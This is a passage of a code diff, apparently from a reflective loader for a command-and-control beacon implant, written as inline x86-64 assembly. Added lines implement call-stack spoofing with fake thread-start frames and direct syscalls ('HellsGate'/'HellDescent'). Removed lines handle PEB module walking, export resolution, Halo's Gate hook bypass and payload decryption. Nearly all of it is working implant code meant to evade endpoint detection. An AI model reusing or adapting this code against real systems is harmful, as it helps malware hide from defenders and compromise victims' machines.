+//    [rsp+0x48],    - [optional] API Call Argument # 6 (if [rsp+0x38] == 2) 
+//    [rsp+0x50],    - [optional] API Call Argument # 7 (if [rsp+0x38] == 3) 
+// ..)
+"spoof_synthetic_callstack:\n"
+    "mov rax, r12\n"                      // move r12 into the volatile rax register
+    "mov r10, rdi\n"                      // move rdi into the volatile r10 register 
+    "mov r11, rsi\n"                      // move rsi into the volatile r11 register
+    "pop r12\n"                           // pop the real return address in r12
+    "mov rdi, [rsp + 0x20]\n"             // &Spoof_Struct - spoof_synthetic_callstack() [rsp+0x28],    - Pointer to Spoof Struct 
+    "mov rsi, [rsp + 0x28]\n"             // spoof_synthetic_callstack() [rsp+0x30],    - Pointer to API Call
+    // Save our original non-volatile registers. We will restore these later before returning to our implant
+    "mov [rdi + 0x18], r10\n"              // Spoof_Struct.rdi
+    "mov [rdi + 0x58], r11\n"              // Spoof_Struct.rsi
+    "mov [rdi + 0x60], rax\n"              // Spoof_Struct.r12 ; r12 was saved to rax before clobbered
+    "mov [rdi + 0x68], r13\n"              // Spoof_Struct.r13
+    "mov [rdi + 0x70], r14\n"              // Spoof_Struct.r14
+    "mov [rdi + 0x78], r15\n"              // Spoof_Struct.r15
+    // registers rax, r10, r11 are now free to use again
+  // rsp offset is now -0x8 for spoof_synthetic_callstack() args since we popped the ret into r12
+  "prepare_synthetic_stack_frames:\n"
+    "xor r11, r11\n"                      // r11 = loop counter
+    "mov r13, [rsp + 0x30]\n"             // r13 = Number of Arguments on Stack (Args 5+)
+    //"mov r14, 0x200\n"                  // r14 will hold the offset we need to push 
+    "xor r14, r14\n"                      // r14 will hold the offset we need to push 
+    "add r14, 0x08\n"
+    // "add r14, [rdi + 0x80]\n"          // ThreadStartAddress  (Spoof_Struct.frame_2_stack_frame_size) stack frame size
+    "add r14, [rdi + 0x38]\n"             // RtlUserThreadStart  (Spoof_Struct.frame_0_stack_frame_size) stack frame size
+    "add r14, [rdi + 0x30]\n"             // jmp rbx gadget      (Spoof_Struct.gadget_stack_frame_size)  stack frame size 
+    "add r14, [rdi + 0x20]\n"             // BaseThreadInitThunk (Spoof_Struct.frame_1_stack_frame_size) stack frame size 
+    "sub r14, 0x20\n"                     // first stack arg is located at +0x28 from rsp, so we sub 0x20 from the offset. Loop will sub 0x8 each time
+    "mov r10, rsp\n"                      
+    "add r10, 0x30\n"                     // offset of stack arg added to rsp
+  "loop_move_api_call_stack_args:\n"
+    "xor r15, r15\n"                      // r15 will hold the offset + rsp base
+    "cmp r11, r13\n"                      // comparing # of stack args added vs # of stack args we need to add
+  "je create_synthetic_stack_frames\n"
+    // Getting location to move the stack arg to
+    "sub r14, 0x08\n"                     // 1 arg means r11 is 0, r14 already 0x28 offset
+    "mov r15, rsp\n"                      // get current stack base
+    "sub r15, r14\n"                      // subtract offset
+    // Procuring the stack arg
+    "add r10, 0x08\n"
+    "push [r10]\n"
+    "pop  [r15]\n"                        // move the stack arg into the right location
+    // Increment the counter and loop back in case we need more args
+    "add r11, 0x01\n"
+  "jmp loop_move_api_call_stack_args\n"
+
+  "create_synthetic_stack_frames:\n"
+    //"sub rsp, 0x200\n"                  // Create new stack frame
+    "push 0x0\n"                          // Push 0 to terminate stackwalk after RtlUserThreadStart stack frame
+    // RtlUserThreadStart + 0x14  frame
+    "sub rsp,   [rdi + 0x38]\n"           // RtlUserThreadStart  (Spoof_Struct.frame_0_stack_frame_size) stack frame size
+    "mov r11,   [rdi + 0x40]\n"           // RtlUserThreadStart  (Spoof_Struct.frame_0_return_address)   return address
+    "mov [rsp], r11\n"
+    // BaseThreadInitThunk + 0x21 frame
+    "sub rsp,   [rdi + 0x20]\n"           // BaseThreadInitThunk (Spoof_Struct.frame_1_stack_frame_size) stack frame size 
+    "mov r11,   [rdi + 0x28]\n"           // BaseThreadInitThunk (Spoof_Struct.frame_1_return_address)   return address
+    "mov [rsp], r11\n"
+    // ThreadStartAddress  frame
+    // "sub rsp,   [rdi + 0x80]\n"        // ThreadStartAddress (Spoof_Struct.frame_2_stack_frame_size) stack frame size 
+    // "mov r11,   [rdi + 0x88]\n"        // ThreadStartAddress (Spoof_Struct.frame_2_return_address)   return address
+    // "mov [rsp], r11\n"`
+    // Gadget frame
+    "sub rsp,   [rdi + 0x30]\n"           // jmp rbx gadget      (Spoof_Struct.gadget_stack_frame_size)  stack frame size 
+    "mov r11,   [rdi + 0x50]\n"           // jmp rbx gadget      (Spoof_Struct.gadget_return_address)    return address
+    "mov [rsp], r11\n"
+    // Adjusting the param struct for the fixup
+    "mov r11,          rsi\n"             // Copying function to call into r11
+    "mov [rdi + 0x08], r12\n"             // Spoof_Struct.original_return_address 
+    "mov [rdi + 0x10], rbx\n"             // Spoof_Struct.rbx - save original rbx to restore later
+    "lea rbx,          [rip + fixup]\n"   // Fixup address is moved into rbx
+    "mov [rdi],        rbx\n"             // Fixup member now holds the address of Fixup
+    "mov rbx,          rdi\n"             // Address of param struct (Fixup) is moved into rbx
+    // For indirect syscalls
+    "mov r10, rcx\n"           // RCX = API Call Argument # 1
+    "mov rax, [rdi + 0x48]\n"
+    "jmp r11\n"                // jump to Spoof Struct -> Pointer to API Call
+  "fixup:\n" // retore the stack of our implant and return to it
+    "mov rcx, rbx\n"
+    //"add rsp, 0x200\n"              // adjust RSP frame
+    "add rsp, [rbx + 0x30]\n"         // Spoof_Struct.gadget_stack_frame_size
+    // "add rsp, [rbx + 0x80]\n"      // Spoof_Struct.frame_2_stack_frame_size
+    "add rsp, [rbx + 0x20]\n"         // Spoof_Struct.frame_1_stack_frame_size
+    "add rsp, [rbx + 0x38]\n"         // Spoof_Struct.frame_0_stack_frame_size
+    "mov rbx, [rcx + 0x10]\n"         // restore original rbx
+    "mov rdi, [rcx + 0x18]\n"         // restore original rdi
+    "mov rsi, [rcx + 0x58]\n"         // restore original rsi
+    "mov r12, [rcx + 0x60]\n"         // restore original r12
+    "mov r13, [rcx + 0x68]\n"         // restore original r13
+    "mov r14, [rcx + 0x78]\n"         // restore original r14
+    "mov r15, [rcx + 0x78]\n"         // restore original r15
+    "mov rcx, [rcx + 0x08]\n"         // Spoof_Struct.original_return_address
+    "jmp rcx\n"    // return to implant
 
 "returnRDI: \n"
     "mov rax, rdi \n"   // RDI is non-volatile. Raw Beacon Base Address will be returned 
-    "ret \n"
-
-"getRip: \n"
-    "mov rax, [rsp] \n"             // get the return address
-    "ret \n"
-
-"getRdllBase: \n" // RAX, RBX, RCX
-    "push rbx \n"
-    "xor rbx, rbx \n"
-    "mov ebx, 0xB0C0ACDC \n"        // egg
-"dec: \n"
-    "dec rcx \n"
-    "cmp ebx, [rcx] \n"             // check for egg
-    "jne dec \n"
-    "mov rax, rcx \n"               // copy the position pointer
-    "sub rax, 0x4 \n"               // check for second egg. If it's not there then its an error
-    "cmp ebx, [rax] \n"             // check for egg
-    "jne dec \n"
-    "sub rax, 0x50 \n"              // Return the base address of our reflective DLL
-    "pop rbx \n"
-    "ret \n"                        // return initRdllAddr
-
-"getDllBase: \n" // RAX, R8, RCX, RDX, RSI, r9, R10, R11
-    "push rcx \n"                   // save our string arg on the top of the stack
-   "call StringLengthA \n"          // RAX will be the strlen
-    "sub rax, 0x4 \n"               // subtract 4 from our string. Truncates the ".dll" or ".exe"
-    "mov r10, rax \n"               // save strlen in the r10 reg
-    "pop rcx \n"                    // get our string arg from the top of the stack
-    "mov r8, 0 \n"                  // Clear
-    "mov r9, 0 \n"                  // Clear 
-    "mov r8, gs:[0x60] \n"          // ProcessEnvironmentBlock // GS = TEB
-    "mov r8, [r8+0x18] \n"          // _PEB_LDR_DATA
-    "mov r8, [r8+0x20] \n"          // InMemoryOrderModuleList - First Entry (probably the host PE File)
-    "mov r11, r8 \n"                // save so we know the end of the modList
-  "crawl: \n" // RDX RCX R10
-    "mov rdx, [r8+0x50] \n"         // BaseDllName Buffer - AKA Unicode string for module in InMemoryOrderModuleList
-    "push rcx \n"                   // save our string arg on the top of the stack
-    "mov rax, r10 \n"               // reset our string counter
-   "call cmpDllStr \n"              // see if our strings match
-    "pop rcx \n"                    // remove string arg from the top of the stack
-    "test rax, rax \n"              // is cmpDllStr match?
-   "je successGetDllBase \n"
-    "mov r8, [r8] \n"               // InMemoryOrderLinks Next Entry
-    "cmp r11, [r8] \n"              // Are we back at the same entry in the list?
-   "je failGetDllBase \n"           // if we went through all modules in modList then return 0 to caller of getDllBase 
-   "jmp crawl \n"
-      "cmpDllStr: \n"
-          "push r8 \n"              // Save register and fix before exiting cmpDllStr()
-          "mov r8, 0 \n"            // Clear
-        "cmpDllStr_loop: \n"
-          "mov r8b, [rcx] \n"       // move the byte in string that we pass as an arg to getDllBase() into the lowest byte of the RSI register
-          "mov r9b, [rdx] \n"       // move the byte in string from the InMemList into the lowest byte of the RDI register
-          "or r8b, 0x20 \n"         // convert to lowercase if uppercase
-          "or r9b, 0x20 \n"         // convert to lowercase if uppercase
-          "cmp r9b, r8b \n"         // cmp character byte in the strings
-         "jne failcmpDllStr \n"     // if no match then return to the caller of cmpDllStr
-          "dec rax \n"              // decrement the counter
-          "test rax, rax \n"        // is counter zero?
-         "je matchStr \n"           // if we matched the string 
-          "add rdx, 0x2 \n"         // move the unicode string to the next byte and skip the 0x00
-          "inc rcx \n"              // move our string to the next char
-         "jmp cmpDllStr_loop \n"    // compare the next string byte
-            "failcmpDllStr: \n"
-              "mov rax, 0xFFFF \n"  // return 0xFFFF
-              "jmp exitCmpDllStr \n"
-            "matchStr: \n"
-              "xor rax, rax \n"     // return 0x0 
-        "exitCmpDllStr: \n"
-          "pop r8 \n"           // restore the r8 register
-          "ret \n"
-  "failGetDllBase: \n"
-    "xor rax, rax \n"           // return 0x0 
-    "jmp end \n"
-  "successGetDllBase: \n"
-    "mov rax, [r8+0x20] \n"         // DllBase Address in process memory
-  "end: \n"
-    "ret \n"                        // return to caller
-
-"getExportDirectory:     \n"
-    "push rbx            \n" // save the rbx register to the stack
-    "mov r8, rcx         \n"
-    "mov ebx, [rcx+0x3C] \n"
-    "add rbx, r8         \n"
-    "xor rax, rax        \n"
-    "mov eax, [rbx+0x88] \n"
-    "add rax, r8         \n"
-    "pop rbx \n" // restore rbx from stack
-    "ret \n" // return ExportDirectory;
-
-"getExportDirectorySize: \n"
-    "push rbx            \n"
-    "mov r8, rcx         \n"
-    "mov ebx, [rcx+0x3C] \n"
-    "add rbx, r8         \n"
-    "xor rax, rax        \n"
-    "mov eax, [rbx+0x8c] \n"
-    "pop rbx             \n"
-    "ret \n" // return ExportDirectory Size;
-
-"getExportAddressTable: \n"
-    "xor rax, rax       \n"
-    "add rdx, 0x1C      \n"   // unsigned long AddressOfFunctions; // 0x1C offset // RDX = &RVAExportAddressTable
-    "mov eax, [rdx]     \n"   // RVAExportAddressTable (Value/RVA)
-    "add rax, rcx       \n"   // VA ExportAddressTable (The address of the Export table in running memory of the process)
-    "ret \n" // return ExportAddressTable
-
-"getExportNameTable:    \n"
-    "xor rax, rax       \n"
-    "add rdx, 0x20      \n"   // unsigned long AddressOfFunctions; // 0x20 offset
-    "mov eax, [rdx]     \n"   // RVAExportAddressOfNames (Value/RVA)
-    "add rax, rcx       \n"   // VA ExportAddressOfNames
-    "ret \n" // return ExportNameTable;
-
-"getExportOrdinalTable: \n"
-    "xor rax, rax       \n"
-    "add rdx, 0x24      \n"   // unsigned long AddressOfNameOrdinals; // 0x24 offset
-    "mov eax, [rdx]     \n"   // RVAExportAddressOfNameOrdinals (Value/RVA)
-    "add rax, rcx       \n"   // VA ExportAddressOfNameOrdinals
-    "ret \n" // return ExportOrdinalTable;
-
-"getNumberOfNames: \n"
-    "xor rax, rax \n"
-    "mov eax, [rcx+0x18] \n"
-    "ret \n"
-
-// void *   getSymbolAddress(void * symbolStr, unsigned long StrSize, void * dllBase, void * AddressTable, void * NameTable, void * OrdinalTable, unsigned int NumberOfNames);
-//                                 RCX                   RDX                R8               r9                [rsp+0x28]         [rsp+0x30]               [rsp+0x38]
-"getSymbolAddress: \n" // RAX,RCX,RDI,RSI,R8,R9,R10,R11
-    "mov r10, [rsp+0x28] \n"        // ExportNameTable
-    "mov r11, [rsp+0x30] \n"        // ExportOrdinalTable
-    "xor rax, rax \n"               // Clear upper bits in RAX
-    "mov eax, [rsp+0x38] \n"        // NumberOfNames
-    "dec rax \n"                    // --NumberOfNames
-    "xchg rcx, rdx \n"              // symbolStringSize & RDX =symbolString
-    "push rdi \n"                   // Save RDI value and restore at end of function
-    "push rsi \n"                   // Save RSI value and restore at end of function
-    "push rcx \n"                   // push str len to stack
-"lFindSym: \n"
-    "mov rcx, [rsp] \n"             // unsigned long symbolStringSize (Reset string length counter for each loop)
-    "xor rdi, rdi \n"               // Clear RDI for setting up string name retrieval
-    "mov edi, [r10+rax*4] \n"       // RVA NameString = [&NamePointerTable + (Counter * 4)]
-    "add rdi, r8 \n"                // &NameString    = RVA NameString + &module.dll
-    "mov rsi, rdx \n"               // Address of API Name String to match on the Stack (reset to start of string)
-    "repe cmpsb \n"                 // Compare strings at RDI & RSI
-    "je FoundSym \n"                // If match then we found the API string. Now we need to find the Address of the API
-    "test rax, rax \n"
-    "je NotFoundSym \n"             // If we check every exported function, return NULL
-    "dec rax \n"                    // Decrement to check if the next name matches
-    "jmp short lFindSym \n"         // Jump back to start of loop
-"FoundSym: \n"
-    "pop rcx \n"                    // Remove string length counter from top of stack
-    "mov ax, [r11+rax*2] \n"        // [&OrdinalTable + (Counter*2)] = ordinalNumber of module.<API>
-    "mov eax, [r9+rax*4] \n"        // RVA API = [&AddressTable + API OrdinalNumber]
-    "add rax, r8 \n"                // module.<API> = RVA module.<API> + module.dll BaseAddress
-    "sub r11, rax \n"               // See if our symbol address is greater than the OrdinalTable Address. If so its a forwarder to a different API
-    "jns ExitGetSysAddr \n"         // If forwarder, result will be negative and Sign Flag is set (SF), jump not sign = jns
-    "mov rax, 0x0 \n"               // If forwarder, return 0x0 and exit
-    "jmp ExitGetSysAddr \n"         // Exit function, return symbol address in RAX
-"NotFoundSym: \n"
-    "pop rcx \n"                    // Remove string length counter from top of stack
-    "xor rax, rax \n"               // Return 0x0 to the caller if we can't find the symbol in the DLL              
-"ExitGetSysAddr: \n"
-    "pop rsi \n"                    // Restore RSI
-    "pop rdi \n"                    // Restore RDI
-    "ret \n"
-
-"getNewExeHeader: \n"
-    "xor rax, rax \n"
-    "mov eax, [rcx+0x3C] \n"        // Offset NewEXEHeader
-    "add rax, rcx \n"               // &module.dll + Offset NewEXEHeader = &NewEXEHeader
-    "ret \n" // return NewExeHeader;
-
-"getDllSize: \n"
-    "push rbx \n"
-    "xor rbx, rbx \n"
-    "mov ebx, [rcx+0x50] \n"        // ((PIMAGE_NT_HEADERS)newExeHeaderAddr)->OptionalHeader.SizeOfImage
-    "mov rax, rbx \n"
-    "pop rbx \n"
-    "ret \n" // return dllSize;
-
-"getDllSizeOfHeaders: \n"
-    "push rbx \n"
-    "xor rbx, rbx \n"
-    "mov ebx, [rcx+0x54] \n"        // ((PIMAGE_NT_HEADERS)newExeHeaderAddr)->OptionalHeader.SizeOfHeaders
-    "mov rax, rbx \n"
-    "pop rbx \n"
-    "ret \n" // return SizeOfHeaders;
-
-"Memcpy: \n"  // RAX, RBX, RCX, RDX, R8
-    "xor r10, r10 \n"
-    "test r8, r8 \n"                // check if r8 = 0
-    "jne copy1 \n"                  // if r8 == 0, ret
-    "ret \n"                        // Return to caller
-"copy1: \n"
-    "dec r8 \n"                     // Decrement the counter
-    "mov r10b, [rdx] \n"              // Load the next byte to write
-    "mov [rcx], r10b \n"              // write the byte
-    "inc rdx \n"                    // move rdx to next byte of source
-    "inc rcx \n"                    // move rcx to next byte of destination
-    "test r8, r8 \n"                // check if r8 = 0
-    "jne copy1 \n"                  // if r8 != 0, then write next byte via loop
-    "ret \n"                        // Return to Memcpy()
-
-"getOptionalHeader: \n" // RAX, RCX
-    "add rcx, 0x18 \n"
-    "xchg rax, rcx \n"
-    "ret \n" // return OptionalHeader
-
-"getSizeOfOptionalHeader: \n" // RAX, RBX, RCX
-    "push rbx \n"
-    "add rcx, 0x14 \n"              // &FileHeader.SizeOfOptionalHeader
-    "xor rbx, rbx \n"
-    "mov bx, [rcx] \n"              // Value of FileHeader.SizeOfOptionalHeader
-    "xchg rax, rbx \n"
-    "pop rbx \n"
     "ret \n"
 
 "add: \n"
@@ -1006,60 +1595,29 @@ __asm__(
     "xchg rax, rcx \n"
     "ret \n"
 
-"getNumberOfSections: \n" // RAX, RCX
-    "add rcx, 0x6 \n"               // &FileHeader.NumberOfSections
-    "xor rax, rax \n"
-    "mov ax, [rcx] \n"
-    "ret \n"
-
-"getBeaconEntryPoint: \n" // RAX, RCX, RDX
-    "add rdx, 0x10 \n"              // OptionalHeader.AddressOfEntryPoint
-    "mov eax, [rdx] \n"
-    "add rax, rcx \n"               // newRdllAddr.EntryPoint
-    "ret \n" // return newRdllAddrEntryPoint
-
-"copyWithDelimiter: \n" // RAX, RBX, RCX, RDX, R8, R9, R10
-    "push rbx \n"
-    "xor rax, rax \n"               // number of bytes copied
-"copyLoop: \n"
-    "mov r10, rax \n"
-    "sub r10, r8 \n"                // check if we copied enough bytes
-    "jns copydone \n"
-    "mov bl, [rdx] \n"              // read byte
-    "mov [rcx], bl \n"              // write byte
-    "inc rdx \n"
-    "inc rcx \n"
-    "inc rax \n"                    // increment bytes written
-    "cmp bl, r9b \n"                // check if we found the delimiter
-    "je copydone\n"
-    "jmp copyLoop \n"
-"copydone: \n"
-    "pop rbx \n"
-    "ret \n"
-
 "getSyscallNumber: \n" // RAX,RCX,RDX
     "push rcx \n"
-    "call findSyscallNumber \n"     // try to read the syscall directly
+    "call findSyscallNumber \n"   // try to read the syscall directly
     "pop rcx \n"
     "test ax, ax \n"
     "jne syscallnothooked \n"
-    "mov dx, 0 \n"                 // index = 0
+    "mov dx, 0 \n"                // index = 0
 "loopoversyscalls: \n"
     "push rcx \n"
     "push dx \n"
-    "call halosGateUp\n"            // try to read the syscall above
+    "call halosGateUp\n"          // try to read the syscall above
     "pop dx \n"
     "pop rcx \n"
     "test ax, ax \n"
     "jne syscallnothookedup \n"
     "push rcx \n"
     "push dx \n"
-    "call halosGateDown\n"          // try to read the syscall below
+    "call halosGateDown\n"        // try to read the syscall below
     "pop dx \n"
     "pop rcx \n"
     "test ax, ax \n"
     "jne syscallnothookeddown \n"
-    "inc dx \n"                    // increment the index
+    "inc dx \n"                   // increment the index
     "jmp loopoversyscalls \n"
 "syscallnothooked: \n"
     "ret \n"
@@ -1126,74 +1684,16 @@ __asm__(
     "pop rdi           \n"
     "ret               \n"
 
-"HellsGate: \n"  // Loads the Syscall number into the R11 register before calling HellDescent()
-    "xor r11, r11 \n"
-    "mov r11d, ecx \n"  // Save Syscall Number in R11
-    "push rdx \n"
-    "pop rcx \n" // Save NtApi address in RCX
-    "call GetSyscallAddress \n"
-    "mov r10, rcx \n" //Save syscall address in R10
-    "ret \n"
-
-"HellDescent: \n" // Called directly after HellsGate
-    "xor rax, rax \n"
-    "mov eax, r11d \n"  // Move the Syscall Number into RAX
-    "mov r11, r10 \n" // Move the syscall address to R11
-    "mov r10, rcx \n"
-    "jmp r11 \n"
-    
-"GetSyscallAddress: \n"  // Get the syscall address by byte by byte checking
-    "mov edx, 25 \n"
-"find_syscall_address_loop: \n"
-    "mov r10, [rcx+rdx-1] \n"
-    "cmp r10, 0x05 \n"
-    "jne find_syscall_address_next \n"
-    "mov r10, [rcx+rdx-2] \n"
-    "cmp r10, 0x0F \n"
-    "jne find_syscall_address_next \n"
-    "lea rcx, [rcx+rdx-2] \n"
-    "mov rax, rcx \n"
-    "ret \n"
-"find_syscall_address_next: \n"
-    "dec edx \n"
-    "jnz find_syscall_address_loop \n"
-    "xor rax, rax \n"
-    "ret \n"
-
-"getFirstEntry:          \n"  // RAX, RCX
-    "mov rax, gs:[0x60]  \n"  // ProcessEnvironmentBlock // GS = TEB
-    "mov rax, [rax+0x18] \n"  // _PEB_LDR_DATA
-    "mov rax, [rax+0x20] \n"  // InMemoryOrderModuleList - First Entry (probably the host PE File)
-    "ret                 \n"
-
-"getNextEntry:           \n"  // RAX, RCX
-    "mov rax, [rcx]      \n"
-    "cmp rdx, [rax]      \n"  // Are we back at the same entry in the list?
-    "jne notTheLast      \n"
-    "xor rax, rax        \n"
-"notTheLast:             \n"
-    "ret                 \n"
-
-"getDllBaseFromEntry:    \n"  // RAX,RCX
-    "mov rax, [rcx+0x20] \n"
-    "ret                 \n"
-
-"basicCaesar_Decrypt:\n" // RAX,RCX,RDX,RSI,RDI
-    "push rdi      \n"
-    "push rsi      \n"
-    "mov rsi, rdx  \n"
-    "xor rax, rax  \n"
-    "add al, r8b   \n"
-"bcdLoop:          \n"
-    "sub [rsi], al \n"
-    "inc rsi       \n"
-    "dec cl        \n"
-    "test cl,cl    \n"
-    "jnz bcdLoop   \n"
-    "pop rsi       \n"
-    "pop rdi       \n"
+"HellsGate:        \n" // Loads the Syscall number into the R11 register before calling HellDescent()
+    "xor r11, r11  \n"
+    "mov r11d, ecx \n" // Save Syscall Number in R11
     "ret           \n"
 
+"HellDescent:      \n" // Called directly after HellsGate
+    "xor rax, rax  \n"
+    "mov r10, rcx  \n"
+    "mov eax, r11d \n" // Move the Syscall Number into RAX before calling syscall interrupt
+    "syscall       \n"
+    "ret           \n"
 
-
-);
+);   
